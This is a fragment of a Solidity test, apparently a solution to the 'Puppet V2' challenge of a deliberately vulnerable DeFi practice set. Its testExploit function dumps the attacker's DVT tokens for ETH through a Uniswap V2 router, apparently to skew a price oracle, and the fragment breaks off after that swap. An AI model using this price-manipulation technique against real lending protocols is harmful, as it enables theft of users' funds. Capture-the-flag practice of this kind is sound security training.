...
contract PuppetV2 is Test {
    ...
    // Storage variable for the uniswap router
    address[] path;
    ...
    function testExploit() public {
        ...
        uint256 amountIn = dvt.balanceOf(attacker);
        uint256 amountOutMin = 9 ether;
        path.push(address(dvt));
        path.push(address(weth));
        dvt.approve(address(uniswapV2Router), amountIn);
        uniswapV2Router.swapExactTokensForETH(amountIn, amountOutMin, path, attacker, block.timestamp + 2 days);
